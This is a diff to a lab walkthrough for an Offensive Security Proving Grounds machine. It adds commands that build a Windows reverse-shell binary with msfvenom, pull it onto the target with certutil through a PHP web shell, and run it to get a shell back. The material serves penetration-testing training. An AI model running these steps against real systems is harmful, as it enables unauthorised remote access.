@@ -495,13 +495,24 @@ We are regular users, with restricted access to sensitive data and restricted pr
 
 ![](Images/Pasted%20image%2020221020192543.png)
 
-#### - Hosted the rev.exe binary on my kali machine with python
+- We enter the following command on our Kali machine to create a reverse shell binary.
 
-#### - Typed "certutil.exe -urlcache -split -f "http://192.168.49.114/rev.exe" to downoad the reverse shell binary to the target machine
+msfvenom -p windows/x64/shell_reverse_tcp -f exe -o rev.exe LHOST=192.168.224.127 LPORT=139
 
-#### - Typed http://192.168.49.114/cmd.php?cmd=rev.exe to execute the reverse shell binary and received a shell back:
+- On our Kali machine, we launch an HTTP server to host the reverse shell binary.
+  
+- To download the reverse shell binary to the target machine, we use the following command in the web shell,
 
-![](Images/Pasted%20image%2020221020192820.png)
+http://192.168.224.127:45332/cmd.php?cmd=certutl -urlcache -split -f http://192.168.45.167/rev.exe
+
+-  In order to run the reverse shell binary and get a shell back, we input the following command.
+
+http://192.168.224.127:45332/cmd.php?cmd=rev.exe
+
+![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/93614b8e-deea-4c2b-9033-ee3d51a71e0d)
+
+![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/2e50beff-e702-4afd-8c2b-1d286b04f1ec)
+
 
 ---
 
